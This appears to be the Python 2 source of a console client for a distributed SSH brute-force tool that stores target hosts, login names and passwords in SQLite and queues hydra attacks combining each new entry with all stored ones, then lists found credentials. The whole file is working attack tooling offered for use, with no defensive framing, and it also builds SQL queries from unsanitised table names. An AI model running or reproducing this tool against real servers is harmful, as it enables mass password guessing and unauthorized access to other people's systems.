#!/usr/bin/env python2
# -*- coding: utf-8 -*-
###
#
# Console-based client
#
###

###
# STD modules
###
import os, sys, logging, optparse, time, subprocess

###
# Project
###
import config
import lib.console
import lib.db
import tasks

class app(lib.console.app):
    '''Console based UI'''

    OPTIONS = [
        ('level', 'Log level from 1 (critical) to 5 (debug). Default: 4', 4),
    ]

    ###
    # Execution
    ###
    def start(self, args=None, histfile=config.HISTORY):
      super(app, self).start()

    ###
    # Fetch data
    ###
    def _fetch_data(self, table):
      try:
        self.db.params['dbname'] = 'databases/d2bfs.db'
        self.db.params['table'] = table
        self.db.connect()
        self.db.select('SELECT * FROM %s' % self.db.params['table'], None)
        datas = self.db.params['selects']
        self.db.close()
      except Exception, e:
        self.log.error("%s"%e)
      datas = [list(map(str, row)) for row in datas]
      if not datas:
        return ''
      new_file = "logs/%d_%s"%(int(time.time()), table)
      f = open(new_file, 'w')
      for data in datas:
        f.write("%s\n" % data[1])
      f.close()
      return new_file

    ###
    # Insert data
    ###
    def _insert_data(self, table, value):
      try:
        self.db.params['dbname'] = 'databases/d2bfs.db'
        self.db.params['table'] = table
        self.db.connect()
        self.db.select('SELECT * FROM ' + self.db.params['table'] + ' WHERE val=?', (value,))
        if self.db.params['selects']:
          self.log.info("%s is already into database"%value)
          self.db.close()
          return 
        self.db.params['cursor'].execute('INSERT INTO ' + self.db.params['table'] + ' VALUES  (NULL, ?)', (value,))
        self.db.params['connex'].commit()
        self.db.close()
      except Exception, e:
        self.log.error('%s'%e)

    ###
    # Command: insert data into datatabase
    ###
    def help_insert(self):
      self.log.warning('insert <table> <value>')
      self.log.warning('__with__ table:')
      self.log.warning('  hosts : hosts[:port] table (ip or hostname)')
      self.log.warning('  users : login table (root, toor, etc)')
      self.log.warning('  pass  : password table')

    def do_insert(self, args):
      '''Push data (new host, new user or new pass) into database after bruteforce'''
      if not args or args == '':
        self.help_insert()
        return
      self._insert_data(args[0], args[1])

    ###
    # Command: push host 
    ###
    def help_host(self):
      self.log.warning('host <host:port>')
      self.log.warning('eg: host 192.168.0.1:22\n')

    def do_host(self, args):
      '''Start BF NEW hosts with ALL users and ALL pass'''
      if not args[0] or args[0] == '' or not args[0].find(':'):
        self.help_host()
        return        
      self.log.info("Start BF NEW hosts with ALL users and ALL pass")
      file_users = self._fetch_data("users")
      file_pass = self._fetch_data("pass")
      if not file_users or not file_pass:
        self.log.error("No user and/or pass")
        return
      file_results = "results/%d"%int(time.time())
      cmdline = ["hydra", "-L", file_users, "-P", file_pass, "-u", "-e", "sr", "-o", file_results, "ssh://%s"%args[0]]
      self.log.info("Task: %s" % ' '.join(cmdline))
      try:
        tasks.run_bf_ssh.delay(cmdline, file_results)
      except Exception, e:
        self.log.error("%s"%e)
      self._insert_data("hosts", args[0])
      
    ###
    # Command: push password 
    ###
    def help_pass(self):
      self.log.warning('pass <pass>')

    def do_pass(self, args):
      '''Start BF NEW pass with ALL hosts and ALL users'''
      if not args[0] or args[0] == '':
        self.help_pass()
        return        
      self.log.info("Start BF NEW pass with ALL hosts and ALL users")
      file_hosts = self._fetch_data("hosts")
      file_users = self._fetch_data("users")
      if not file_hosts or not file_users:
        self.log.error("No hosts and/or users")
        return
      file_results = "results/%d"%int(time.time())
      cmdline = ["hydra", "-M", file_hosts, "-L", file_users, "-p", args[0], "-u", "-e", "sr", "-o", file_results, "ssh"]
      self.log.info("Task: %s" % ' '.join(cmdline))
      try:
        tasks.run_bf_ssh.delay(cmdline, file_results)
      except Exception, e:
        self.log.error("%s"%e)
      self._insert_data("pass", args[0])

    ###
    # Command: push user
    ###
    def help_user(self):
      self.log.warning('user <user>')

    def do_user(self, args):
      '''Start BF NEW user with ALL hosts and ALL passwords'''
      if not args[0] or args[0] == '':
        self.help_user()
        return        
      self.log.info("Start BF NEW user with ALL hosts and ALL passwords")
      file_hosts = self._fetch_data("hosts")
      file_pass = self._fetch_data("pass")
      if not file_hosts or not file_pass:
        self.log.error("No hosts and/or passwords")
        return
      file_results = "results/%d"%int(time.time())
      cmdline = ["hydra", "-M", file_hosts, "-l", args[0], "-P", file_pass, "-u", "-e", "sr", "-o", file_results, "ssh"]
      self.log.info("Task: %s" % ' '.join(cmdline))
      try:
        tasks.run_bf_ssh.delay(cmdline, file_results)
      except Exception, e:
        self.log.error("%s"%e)
      self._insert_data("users", args[0])

    ###
    # Command: display results
    ###
    def help_results(self):
      self.log.warning('results')

    def do_results(self, args):
      '''Display found credentials on hosts'''
      self.db.params['dbname'] = 'databases/d2bfs.db'
      self.db.params['table'] = 'results'
      self.db.connect()
      self.db.dump(None, None)
      self.db.close()

    ###
    # Command: display results
    ###
    def help_display(self):
      self.log.warning('display <table>')
      self.log.warning('__with__ table:')
      self.log.warning('  hosts : hosts table')
      self.log.warning('  users : login table')
      self.log.warning('  pass  : password table')


    def do_display(self, args):
      '''Display hosts, users and password tables'''
      if not args[0] or args[0] == '':
        self.help_display()
        return
      self.db.params['dbname'] = 'databases/d2bfs.db'
      self.db.params['table'] = args[0]
      self.db.connect()
      self.db.dump(None, None)
      self.db.close()


if __name__ == '__main__': app().start_cli()
